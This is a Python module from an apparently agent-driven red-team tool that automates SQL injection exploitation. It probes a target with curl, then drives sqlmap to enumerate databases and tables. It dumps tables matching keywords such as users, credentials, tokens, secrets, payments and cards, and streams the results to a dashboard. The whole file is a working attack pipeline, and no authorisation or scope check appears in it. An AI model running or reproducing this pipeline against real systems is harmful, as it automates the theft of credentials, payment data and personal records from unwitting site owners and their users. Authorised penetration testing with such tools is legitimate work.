"""Deterministic SQLi auto-pwn pipeline.

Fires once SQLi has been confirmed by recon. Walks curl probe -> sqlmap dbs ->
sqlmap tables -> sqlmap dump on a fixed plan. Every step broadcasts an
`auto_pwn_step` envelope so the dashboard renders it in its own panel — the
LLM never sees or shapes this output.
"""

from __future__ import annotations

import asyncio
import shlex
import uuid
from collections import deque
from datetime import datetime
from typing import Any, Deque

from loguru import logger

from red_agent.backend.schemas.red_schemas import (
    AutoPwnStep,
    AutoPwnStepKind,
    ToolStatus,
)

# In-memory replay buffer so reconnecting clients can re-hydrate the panel.
_HISTORY: Deque[AutoPwnStep] = deque(maxlen=200)

_SYS_DBS = {"information_schema", "mysql", "performance_schema", "sys", "pg_catalog"}
_INTERESTING = (
    "user", "users", "account", "accounts", "credential", "credentials",
    "auth", "admin", "admins", "customer", "customers", "member", "members",
    "session", "sessions", "token", "tokens", "secret", "secrets",
    "payment", "payments", "card", "cards", "wallet",
)

_CURL_TIMEOUT = 15
_SQLMAP_TIMEOUT = 600


# ── Broadcast helpers ────────────────────────────────────────────────────

async def _broadcast(step: AutoPwnStep) -> None:
    from red_agent.backend.websocket.red_ws import manager
    _HISTORY.append(step)
    await manager.broadcast({
        "type": "auto_pwn_step",
        "payload": step.model_dump(mode="json"),
    })


def recent_steps(limit: int = 50) -> list[AutoPwnStep]:
    return list(_HISTORY)[-limit:]


def clear_history() -> None:
    _HISTORY.clear()


# ── Step runners ─────────────────────────────────────────────────────────

async def _run_curl(target: str, mission_id: str | None) -> AutoPwnStep:
    cmd = ["curl", "-i", "-sS", "--max-time", str(_CURL_TIMEOUT), target]
    step = AutoPwnStep(
        id=str(uuid.uuid4()),
        mission_id=mission_id,
        target=target,
        kind=AutoPwnStepKind.CURL_PROBE,
        status=ToolStatus.RUNNING,
        command=" ".join(shlex.quote(c) for c in cmd),
        summary=f"probing {target}",
    )
    await _broadcast(step)

    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, stderr = await asyncio.wait_for(
            proc.communicate(), timeout=_CURL_TIMEOUT + 5
        )
        body = stdout.decode("utf-8", errors="replace")
        first_line = body.splitlines()[0] if body else ""
        step.raw_tail = body[-4000:]
        step.summary = first_line[:160] or "no response"
        step.status = ToolStatus.DONE if proc.returncode == 0 else ToolStatus.FAILED
        if proc.returncode != 0:
            step.error = stderr.decode("utf-8", errors="replace")[-300:]
    except (asyncio.TimeoutError, Exception) as exc:
        step.status = ToolStatus.FAILED
        step.error = str(exc)[:300]

    step.finished_at = datetime.utcnow()
    await _broadcast(step)
    return step


async def _run_sqlmap_step(
    kind: AutoPwnStepKind,
    target: str,
    mission_id: str | None,
    *,
    db: str | None = None,
    table: str | None = None,
    dump_all: bool = False,
) -> AutoPwnStep:
    """Drive sqlmap via the MCP server (same transport the agents use, so this
    works whether the binary lives on Kali or localhost). No LLM in the loop."""
    from red_agent.backend.services.mcp_client import call_tool_and_wait

    label = kind.value.replace("_", " ").lower()
    if db and table:
        label = f"{label} ({db}.{table})"
    elif db:
        label = f"{label} ({db})"
    elif table:
        label = f"{label} ({table})"

    step = AutoPwnStep(
        id=str(uuid.uuid4()),
        mission_id=mission_id,
        target=target,
        kind=kind,
        status=ToolStatus.RUNNING,
        command=_describe_sqlmap_cmd(target, db, table, dump_all, kind),
        summary=f"{label}…",
        db=db,
        table=table,
    )
    await _broadcast(step)

    if kind is AutoPwnStepKind.SQLMAP_DBS:
        mcp_name = "run_sqlmap_dbs"
        args: dict[str, Any] = {"target": target, "wait": True}
    elif kind is AutoPwnStepKind.SQLMAP_TABLES:
        mcp_name = "run_sqlmap_tables"
        args = {"target": target, "db": db or "", "wait": True}
    else:  # DUMP / DUMP_ALL
        mcp_name = "run_sqlmap_dump"
        args = {
            "target": target,
            "db": db,
            "table": table,
            "dump_all": dump_all,
            "wait": True,
        }

    try:
        result = await call_tool_and_wait(mcp_name, args)
    except Exception as exc:
        step.status = ToolStatus.FAILED
        step.error = str(exc)[:300]
        step.finished_at = datetime.utcnow()
        await _broadcast(step)
        return step

    step.raw_tail = (result.get("raw_tail") or "")[-8000:]
    findings = result.get("findings") or []

    if kind is AutoPwnStepKind.SQLMAP_DBS:
        step.items = [f["name"] for f in findings if f.get("type") == "database"]
        step.summary = f"{len(step.items)} databases" if step.items else "no databases extracted"
    elif kind is AutoPwnStepKind.SQLMAP_TABLES:
        step.items = [f["name"] for f in findings if f.get("type") == "table"]
        step.summary = f"{len(step.items)} tables in {db}" if step.items else f"no tables in {db}"
    else:
        step.rows = [f.get("cells", []) for f in findings if f.get("type") == "row"]
        scope = f"{db}.{table}" if table else (db or "all dbs")
        step.summary = f"{len(step.rows)} rows from {scope}"

    ok = result.get("ok", True) and not result.get("error")
    step.status = ToolStatus.DONE if ok else ToolStatus.FAILED
    if not ok and result.get("error"):
        step.error = str(result["error"])[:300]

    step.finished_at = datetime.utcnow()
    await _broadcast(step)
    return step


def _describe_sqlmap_cmd(
    target: str,
    db: str | None,
    table: str | None,
    dump_all: bool,
    kind: AutoPwnStepKind,
) -> str:
    base = f"sqlmap -u {shlex.quote(target)} --batch --random-agent"
    if kind is AutoPwnStepKind.SQLMAP_DBS:
        return base + " --dbs"
    if kind is AutoPwnStepKind.SQLMAP_TABLES:
        return f"{base} -D {shlex.quote(db)} --tables" if db else f"{base} --tables"
    if dump_all:
        if db:
            return f"{base} -D {shlex.quote(db)} --dump-all --exclude-sysdbs"
        return base + " --dump-all --exclude-sysdbs"
    parts = [base]
    if db:
        parts.append(f"-D {shlex.quote(db)}")
    if table:
        parts.append(f"-T {shlex.quote(table)}")
    parts.append("--dump")
    return " ".join(parts)


# ── Pipeline ─────────────────────────────────────────────────────────────

async def _exfil_one(target: str, db: str | None, table: str | None, dump_all: bool) -> dict:
    """One MCP dump call → returns {rows, raw_tail, error}. No broadcast."""
    from red_agent.backend.services.mcp_client import call_tool_and_wait

    try:
        result = await call_tool_and_wait("run_sqlmap_dump", {
            "target": target,
            "db": db,
            "table": table,
            "dump_all": dump_all,
            "wait": True,
        })
    except Exception as exc:
        return {"rows": [], "raw_tail": "", "error": str(exc)[:300]}

    findings = result.get("findings") or []
    rows = [f.get("cells", []) for f in findings if f.get("type") == "row"]
    err = result.get("error") if not result.get("ok", True) else None
    return {
        "rows": rows,
        "raw_tail": (result.get("raw_tail") or "")[-8000:],
        "error": str(err)[:300] if err else None,
    }


# Engines where `--dbs` is meaningless because there's only one schema/file.
_SINGLE_DB_ENGINES = {"sqlite", "ms access", "firebird"}


def _is_single_db(dbms: str | None) -> bool:
    if not dbms:
        return False
    d = dbms.lower()
    return any(eng in d for eng in _SINGLE_DB_ENGINES)


async def auto_sqli_pipeline(
    target: str,
    *,
    mission_id: str | None = None,
    dbms: str | None = None,
    max_dbs: int = 3,
    max_tables_per_db: int = 4,
) -> dict[str, Any]:
    """Walk curl -> (dbs ->)? tables -> ONE growing dump card. Returns summary."""
    logger.info("[auto_pwn] starting on {} (dbms={})", target, dbms)

    summary: dict[str, Any] = {
        "target": target,
        "mission_id": mission_id,
        "dbms": dbms,
        "databases": [],
        "tables": {},
        "dumped": [],
    }

    await _run_curl(target, mission_id)

    user_dbs: list[str] = []
    single_db = _is_single_db(dbms)

    if single_db:
        # SQLite et al. — sqlmap will refuse --dbs ("not possible to enumerate
        # databases"). Skip straight to --tables with no -D flag.
        logger.info("[auto_pwn] {} is single-db engine, skipping --dbs", dbms)
    else:
        dbs_step = await _run_sqlmap_step(
            AutoPwnStepKind.SQLMAP_DBS, target, mission_id,
        )
        if dbs_step.status is ToolStatus.DONE and dbs_step.items:
            summary["databases"] = dbs_step.items
            user_dbs = [d for d in dbs_step.items if d.lower() not in _SYS_DBS][:max_dbs]
        else:
            # If --dbs returned empty AND the raw output mentions SQLite, fall
            # through to single-db path instead of giving up.
            tail = (dbs_step.raw_tail or "").lower()
            if "sqlite" in tail or "not possible to enumerate databases" in tail:
                logger.info("[auto_pwn] --dbs failed but target looks single-db, retrying as SQLite")
                single_db = True
                summary["dbms"] = summary["dbms"] or "SQLite"
            else:
                return summary

    # Per-db tables — one card each. For single-db engines we issue one
    # tables call with no db arg.
    db_table_plan: list[tuple[str | None, str | None, bool]] = []

    db_iterations = [None] if single_db else user_dbs
    for db in db_iterations:
        tables_step = await _run_sqlmap_step(
            AutoPwnStepKind.SQLMAP_TABLES, target, mission_id, db=db,
        )
        if tables_step.status is not ToolStatus.DONE:
            continue
        tables = tables_step.items
        summary["tables"][db or "(default)"] = tables

        interesting = [
            t for t in tables
            if any(kw in t.lower() for kw in _INTERESTING)
        ][:max_tables_per_db]

        if interesting:
            for tbl in interesting:
                db_table_plan.append((db, tbl, False))
        elif tables:
            db_table_plan.append((db, None, True))

    if not db_table_plan:
        return summary

    # ── Single consolidated DUMP card — grows as each table is exfiltrated ──
    dump_step = AutoPwnStep(
        id=str(uuid.uuid4()),
        mission_id=mission_id,
        target=target,
        kind=AutoPwnStepKind.SQLMAP_DUMP,
        status=ToolStatus.RUNNING,
        command=f"sqlmap --dump  ×  {len(db_table_plan)} target(s)",
        summary=f"queuing {len(db_table_plan)} dump(s)…",
    )
    await _broadcast(dump_step)

    raw_chunks: list[str] = []
    for db, tbl, dump_all in db_table_plan:
        # Display label: SQLite has no db name, so fall back to "(default)".
        db_display = db or "(default)"
        label = f"{db_display}.{tbl}" if tbl else f"{db_display}.*"
        result = await _exfil_one(target, db, tbl, dump_all)
        section = {
            "db": db_display,
            "table": tbl or "*",
            "dump_all": dump_all,
            "row_count": len(result["rows"]),
            "rows": result["rows"][:200],  # cap per-section render; raw still has it
            "error": result["error"],
        }
        dump_step.sections.append(section)

        if result["raw_tail"]:
            raw_chunks.append(f"=== {label} ===\n{result['raw_tail']}")
            dump_step.raw_tail = "\n\n".join(raw_chunks)[-32000:]

        total_rows = sum(s.get("row_count", 0) for s in dump_step.sections)
        dump_step.summary = (
            f"{total_rows} rows  •  {len(dump_step.sections)}/{len(db_table_plan)} dumps"
        )

        if section["row_count"]:
            summary["dumped"].append({"db": db, "table": tbl or "*", "rows": section["row_count"]})

        await _broadcast(dump_step)

    any_rows = any(s.get("row_count", 0) for s in dump_step.sections)
    dump_step.status = ToolStatus.DONE if any_rows else ToolStatus.FAILED
    if not any_rows:
        dump_step.summary = "no rows extracted"
    dump_step.finished_at = datetime.utcnow()
    await _broadcast(dump_step)

    logger.info("[auto_pwn] done — {} dbs, {} dumps", len(user_dbs), len(summary["dumped"]))
    return summary
